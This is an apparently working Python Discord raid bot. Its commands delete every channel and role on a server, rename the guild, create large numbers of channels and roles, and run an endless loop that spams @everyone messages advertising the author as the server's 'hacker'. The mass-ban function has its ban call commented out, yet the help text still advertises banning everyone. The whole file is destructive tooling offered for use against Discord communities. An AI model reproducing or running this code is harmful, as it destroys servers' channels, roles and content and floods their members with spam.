import discord
import os
import string    
import random  
import asyncio
import threading


spamMSG = "@everyone https://t.me/GriefersItaliani\nhttps://github.com/kl3sshydra\nhttps://bit.ly/TheKl3sshydra\nkl3sshydra hacked your discord server."


client = discord.Client()

@client.event
async def on_ready():
  print(f'Sono loggato su discord con: {str(client.user)}')


async def delete_all_channel(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue
    S = 10
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    await guild.create_text_channel(ran)

async def clear(ctx, amount):
    await ctx.channel.purge(limit=amount)


async def send_all(guild, message, number):
    for channel in guild.channels:
      if channel != message.channel:
        try:
          counter = 0
          while counter != int(number):
            await channel.send(spamMSG)
            counter = counter + 1
        except:
            continue


async def createChannels(message, number):
  counter = 0
  while counter != int(number):
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    guild = message.guild
    channelname = 'HYDRA-'+ran
    await guild.create_text_channel(channelname)
    counter = counter+1


async def raid(message, number, number_):
  for channel in message.guild.channels:
        try:
          if channel != message.channel:
            await channel.delete()
        except:
            continue

  while True:
    await createChannels(message, number)
    await send_all(message.guild, message, number_)

    



async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            await role.delete()
        except:
            continue

async def massrole(ctx, amount):
  counter = 0
  while counter != amount:
    guild = ctx.guild
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    await guild.create_role(name=ran)
    counter = counter + 1

async def massban(ctx):
   for user in ctx.guild.members:
    try:
      #await user.ban()
      print(user)
    except:
      pass


@client.event
async def on_message(message):
  if message.author == client.user:
    return

  if message.content.startswith('+raid'):
    number = message.content.split(' ')[1]
    number_ = message.content.split(' ')[2]
    await clear(message, 10)
    S = 5
    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
    ran = str(ran)
    await message.guild.edit(name="kl3sshydra was here <3 ")
    await raid(message, number, number_)

  if message.content.startswith('+delete_channels'):
    await clear(message, 1)
    await delete_all_channel(message.guild)

  if message.content.startswith('+massban'):
    await clear(message, 1)
    await massban(message)


  if message.content.startswith('+massrole'):
    await clear(message, 1)
    amount_ = message.content.split(' ')[1]
    try:
      amount_ = int(amount_)
    except:
      amount_ = 10
    await massrole(message, amount_)

  if message.content.startswith('+delete_roles'):
    await clear(message, 1)
    await delete_all_roles(message.guild)



  if message.content.startswith('+cls'):
    amount_ = message.content.split(' ')[1]
    try:
      amount_ = int(amount_)
    except:
      amount_ = 10
    await clear(message, amount_)

  if message.content.startswith('-ping'):    
    await message.channel.send(f"Ping: {client.latency}")

  if message.content.startswith('+help'):
    await message.channel.send("""
**+delete_channels** ->  _deletes all channels._
**+delete_roles** ->  _deletes all roles._
**+massrole [amount]** -> _creates tons of roles._
**+raid [channels] [amount]** ->  _raids the entire server._
**+massban** -> _bans the entire server._
**+role** -> _add a role to yourself._
**+cls [amount]** ->  _clears channel._
    """)
    await asyncio.sleep(3)
    await clear(message, 2)

  
client.run(os.getenv('token'))


